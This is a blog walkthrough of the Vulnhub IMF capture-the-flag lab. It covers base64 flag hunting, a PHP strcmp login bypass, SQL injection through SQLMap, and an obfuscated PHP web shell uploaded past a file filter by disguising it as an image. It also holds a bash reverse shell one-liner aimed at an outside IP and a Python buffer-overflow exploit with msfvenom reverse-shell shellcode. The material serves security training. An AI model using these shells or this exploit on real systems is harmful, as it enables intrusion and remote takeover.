---
title: "Vulnhub - IMF Writeup"
date: 2019-06-05T19:24:33+08:00
description: ""
featuredImage: "https://alicdn.kmahyyg.xyz/asset_files/aether/cat_tech.webp"
categories: ["tech"]
draft: false
displayInMenu: false
displayInList: true
dropCap: false
---

# 紧急插播

https://github.com/numirias/security/blob/master/doc/2019-06-04_ace-vim-neovim.md

# Download here

Target VM: https://download.vulnhub.com/imf/IMF.ova

Difficulty: Beginner/Moderate

IMF is a intelligence agency that you must hack to get all flags and ultimately root. The flags start off easy and get harder as you progress. Each flag contains a hint to the next flag. This IMF has 6 flags.

# Before Start

After you download it, just import to your VMWare workstation and change the network interface type as you pleased. Network is configured via DHCP.

Prepare your Kali and ensure they are in the same subnet.

Open VMware workstation - Edit - Virtual network editor to get the ip range.

## Check VM IP

`nmap -sn -n 172.16.51.0/24`, found: 172.16.51.134

# GOGOGO

## Before Attack

`nmap -A -Pn -p1-65535 -O -oN imf-nmap 172.16.51.134`

Only 80 port is opened, things might be tough.

## Start Attack

### Flag 1

Access to the site, `flag1{YWxsdGhlZmlsZXM=}` found at the `contact.php` source code.

Decode flag via Base64: allthefiles

### Flag 2

`contact.php` src:

```html
        <script src="js/ZmxhZzJ7YVcxbVl.js"></script>
        <script src="js/XUnRhVzVwYzNS.js"></script>
        <script src="js/eVlYUnZjZz09fQ==.min.js"></script>
```

Combine and decode via base64: `flag2{aW1mYWRtaW5pc3RyYXRvcg==}`

Decode again: imfadministrator

### Flag 3

`gobuster -u http://172.16.51.134 -w /<PATH TO DICT>/directory-list-2.3-medium.txt -x php,html,txt,html -o imf.txt` to check if can find something:

```
/contact.php (Status: 200)
/images (Status: 301)
/index.php (Status: 200)
/projects.php (Status: 200)
/css (Status: 301)
/js (Status: 301)
/fonts (Status: 301)
/less (Status: 301)
/server-status (Status: 403)
```

Nothing useful... Try `/imfadministrator`, check webpage source code, found:

```
<!-- I couldn't get the SQL working, so I hard-coded the password. It's still mad secure through. - Roger -->
```

> Please note: OSCP doesn't allow bruteforce and SQLMap/Metasploit etc.

Try to get information from `contact.php`, found 3 usernames: estone, rmichaels, akeith

If you have a invalid username, it will tell you. So the only valid username is : `rmichaels`.

But how about password?

Firstly, `SQL`, SQL Injection? Due to the large amount data here, try SQLMap. NOT WORKING...

Secondly, `hard-coded` ? So, what to do next?

I just asked for help here, got the response:

> Update the name of the field `pass` to be `pass[]`. This means that PHP will interprete this field as **an array**, instead of **a string**. This can some times confuse validation or even string checks, as `strcmp` will return `NULL` if one of the inputs is an array.
> The script compares the user input from the `pass` field to the hardcoded password, using the `strcmp` function. It **then compares the result of this call to the value 0**. If you use `strcmp` to compare a `string` and an `array`, it will return `NULL`. `(NULL == 0) = TRUE`, as we're only using two equals signs. If the author had used three, then this bypass would not work, as `(NULL === 0) = FALSE`.

So just change the form code in HTML.

Got FLAG3: `flag3{Y29udGludWVUT2Ntcw==}` and a link to CMS which goes to `http://172.16.51.134/imfadministrator/cms.php?pagename=home`.

Decode again: continueTOcms

## FLAG 4

The `hard-coded` hint is used, then we need to use `SQL` here. Of course, only param `pagename` can be used.

Try `?pagename=home' AND 1=1` got error notice. So, It's an error-based SQL Injection.

I tried to manually inject, but failed. I have to fire up my SQLMap: `sqlmap --cookie="PHPSESSID=jpsp94fmu4hpmkkij9i5msub05" -u "http://172.16.51.134/imfadministrator/cms.php?pagename=home" -D information_schema` and I found the `SCHEMATA` recorded a database `admin`, enumerate this database again. I found a table called `pages`, then `tutorials-incomplete`, Let's try it.

A QR Code on the page. Decode it via Chrome Extension `Simple QR Generator`, found: `flag4{dXBsb2Fkcjk0Mi5waHA=}`.

Decode again: uploadr942.php

## FLAG 5

Access `http://172.16.51.134/imfadministrator/uploadr942.php`, Intelligence upload form? WTF?! Try to upload a shell.

Generate via AntSword again.

```
<?php // 使用时请删除此行, 连接密码: NLRbeHys ?>
<?php $jtch=create_function(str_rot13('$').chr(01212-01027).chr(0330272/01746).chr(01272-01115).chr(564-463),str_rot13('r').str_rot13('i').str_rot13('n').str_rot13('y').str_rot13('(').str_rot13('$').chr(546-431).chr(0x136-0xc7).str_rot13('z').str_rot13('r').str_rot13(')').str_rot13(';'));$jtch(str_rot13('517475;@riNy($_CBFG[AYEorUlf]);1552425;'));?>
```

got: `Error: Invalid filetype (php)`. Let's try to change to `jpg`, then, got: `Error: CrappyWAF detected malware. Signature: Base64_decode php function detected`.
`eval` function also get banned.

So we use `FFD8FFE0` as prefix to build a fake jpg file to bypass it. Then After successfully uploaded, you got: `<!-- 577539cb4b62 -->` in source code. Next question is, where is the file uploaded?

GOBUSTER! `gobuster -u http://172.16.51.134/imfadministrator -w /<PATH TO DICT>/directory-list-2.3-medium.txt -x txt,html,php,jpg -o imf.txt`

Then: `images`(200) and `uploads`(403), that's it `/imfadministrator/uploads/577539cb4b62.jpg`, gosh, but not executed.

Then modify the file extension to `gif`, wow! executed! The server must interprete the `gif` as `php` script. Now, let's add a shell here. Just replace those `base64_decode()` with `str_rot13()` Try to access `/imfadministrator/uploads/bfecff84de07.gif`

Okay, after that, via Virtual Terminal of AntSword, you'll do anything you love.

The flag is under `uploads` and called `flag5_abc123def.txt`: `flag5{YWdlbnRzZXJ2aWNlcw==}`.

Decode again: agentservices

The `.htaccess` in this folder told us all.

## Flag 6

This machine is designated to be `boot2root`. And with a kernel version `4.4.0-45.66` and `Ubuntu 16.04.1 LTS`, 

Earlier Kernel Version Than:

- 4.8.0-26.28 for Ubuntu 16.10
- 4.4.0-45.66 for Ubuntu 16.04 LTS
- 3.13.0-100.147 for Ubuntu 14.04 LTS
- 3.2.0-113.155 for Ubuntu 12.04 LTS
- 3.16.36-1+deb8u2 for Debian 8
- 3.2.82-1 for Debian 7
- 4.7.8-1 for Debian unstable

are affected by DirtyCoW. So this kernel just fixed this vulnerability.

`agentservices` ? Strange...

I think there might be something to dig, but I'm so lazy and tired. 

Get a reverse shell: `bash -c 'bash -i &>/dev/tcp/192.168.1.68/9943 0<&1'`

LinEnum first:

- Kernel header found. GCC Found. (MAYBE COULD TRY DIRTYCOW)
- A user called `setup` found. (USELESS)
- `tmux`, `screen` found
- `systemd-tmp-files-clean.services` found
- `/usr/bin/knockd -d`  (NO PERMISSION TO CHECK CONFIG)
- `/usr/sbin/sshd -D`    (DISABLED ACCESS)
- `/usr/sbin/xinetd -pidfile /run/xinetd.pid -stayalive -inetd_compat -inetd_ipv6`

`/etc/xinetd.d` has a file called `agent`, let's check. 

```
service agent
{
       flags          = REUSE
       socket_type    = stream
       wait           = no
       user           = root
       server         = /usr/local/bin/agent
       log_on_failure += USERID
       disable        = no
       port           = 7788
}
```

Interesting...

Found `access_codes` here: `SYN 7482,8279,9467`
Seems like knockd config.

Use nmap to send SYN packet.

`nmap -sS -p7482,8279,9467 172.16.51.134` Then port 7788 opened!

`nc 172.16.51.134 7788` it! A binary which ask you for their agent ID...

Download and disassemble. `file agent`:

```
./agent_binary: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=444d1910b8b99d492e6e79fe2383fd346fc8d4c7, not stripped
```

Then `checksec` to help us if we can get something... 

```
* Kernel protection information:

  Description - List the status of kernel protection mechanisms. Rather than
  inspect kernel mechanisms that may aid in the prevention of exploitation of
  userspace processes, this option lists the status of kernel configuration
  options that harden the kernel itself against attack.

  Kernel config:
/boot/config-4.4.0-45-generic

  Warning: The config on disk may not represent running kernel config!

  Vanilla Kernel ASLR:                    Full
  Protected symlinks:                     Disabled
  Protected hardlinks:                    Disabled
  Ipv4 reverse path filtering:            Enabled
  Ipv6 reverse path filtering:            Disabled
  Kernel heap randomization:              Enabled

  GCC stack protector support:            Enabled

  GCC stack protector strong:             Enabled


  Restrict /dev/mem access:               Enabled
  Restrict I/O access to /dev/mem:        Disabled
  Enforce read-only kernel data:          Enabled
  Enforce read-only module data:          Enabled
  Exec Shield:                            Disabled


  Restrict /dev/kmem access:              Enabled

* X86 only:            
  Strict user copy checks:                Disabled

  Address space layout randomization:     Enabled

* SELinux:                                Disabled

  SELinux infomation available here: 
    http://selinuxproject.org/

* grsecurity / PaX:                       No GRKERNSEC

  The grsecurity / PaX patchset is available here:
    http://grsecurity.net/
```

About the binary:

```
./checksec -f /usr/local/bin/agent
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable  FILE
Partial RELRO   No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   83 Symbols     No       0               8       /usr/local/bin/agent
```

> Maybe it's time to write a new article about ltrace and strace, they're really useful here.

Just `ltrace /usr/local/bin/agent` Insert any id, then you got this:

```
ltrace /usr/local/bin/agent
__libc_start_main(0x80485fb, 1, 0xffe4c644, 0x8048970 <unfinished ...>
setbuf(0xf7796d60, 0)                            = <void>
asprintf(0xffe4c578, 0x80489f0, 0x2ddd984, 0xf75fe0ec) = 8
puts("  ___ __  __ ___ "  ___ __  __ ___ 
)                        = 18
puts(" |_ _|  \\/  | __|  Agent" |_ _|  \/  | __|  Agent
)                = 25
puts("  | || |\\/| | _|   Reporting"  | || |\/| | _|   Reporting
)            = 29
puts(" |___|_|  |_|_|    System\n" |___|_|  |_|_|    System

)              = 27
printf("\nAgent ID : "
Agent ID : )                          = 12
fgets(909900
"909900\n", 9, 0xf77965a0)                 = 0xffe4c57e
strncmp("909900\n", "48093572", 8)               = 1
puts("Invalid Agent ID "Invalid Agent ID 
)                        = 18
+++ exited (status 254) +++
```

MSF created 500 bytes: `/opt/metasploit/tools/exploit/pattern_create.rb -l 500`

gdb `r` and use `3` to submit to get an buffer overflow: 0x41366641 (EIP)

`/opt/metasploit/tools/exploit/pattern_offset.rb -q 41366641 -l 500` Found the buffer overflow at offset 168.

Now It's time to build the shellcode, we have two methods here, first: ret2libc, second: ret2mycode.

Due to `NO CANARY` and `NX Disabled`, we use method 2 here.

Let's download this binary, and IDA-it. 

With our lovely `snowman` plugin, just press `F3` to decompile the function we need. You'll find all your input was pointed with EAX.

Get back to [ropshell](http://ropshell.com/ropsearch?h=fabc1afd43f668df0b812213567d032c) , you'll need to find a `call eax` at `0x08048563` to let program return back to the data we input.

We use MSF here: `msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.1.50 LPORT=29099 -f python -b "\x00\x0a\x0d"`  Generate a reverse shell in Python format and avoid null char or newline char.


The payload should be generated in this way: 

```
+======================+==========+
|        Content       |  Length  |
+======================+==========+
| \x90 (which mean nop)| 73 Bytes |
|    PAYLOAD SHELL     | 95 Bytes | 
|     RETURN ADDR      | 04 Bytes |
+======================+==========+
```

Just write a Python to help us:

```python3
#!/usr/bin/env python3

import socket

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect(("172.16.51.134", 7788))
client.recv(512)
client.sendall(b"48093572\n")
client.recv(512)
client.sendall(b"3\n")
client.recv(512)

# shellcode from msfvenom
buf = b""
buf += b"\xd9\xcd\xd9\x74\x24\xf4\xbe\x1d\xe3\x01\xd6\x5a\x29"
buf += b"\xc9\xb1\x12\x31\x72\x17\x83\xea\xfc\x03\x6f\xf0\xe3"
buf += b"\x23\xbe\x2d\x14\x28\x93\x92\x88\xc5\x11\x9c\xce\xaa"
buf += b"\x73\x53\x90\x58\x22\xdb\xae\x93\x54\x52\xa8\xd2\x3c"
buf += b"\xa5\xe2\x24\x8e\x4d\xf1\x26\x9f\x26\x7c\xc7\xef\x5f"
buf += b"\x2f\x59\x5c\x13\xcc\xd0\x83\x9e\x53\xb0\x2b\x4f\x7b"
buf += b"\x46\xc3\xe7\xac\x87\x71\x91\x3b\x34\x27\x32\xb5\x5a"
buf += b"\x77\xbf\x08\x1c"

# padding
buf += b"A" * (168 - len(buf))

# call eax gadget
buf += b"\x63\x85\x04\x08\n"

client.sendall(buf)
client.close()
```

Then you have the root shell, the flag is under `/root/flag.txt`: flag6{R2gwc3RQcm90MGMwbHM=}

Decode again: Gh0stProt0c0ls

# Reference

- http://ropshell.com
- https://stackoverflow.com/questions/12167911/python-socket-send-ascii-command-and-receive-response

(END)
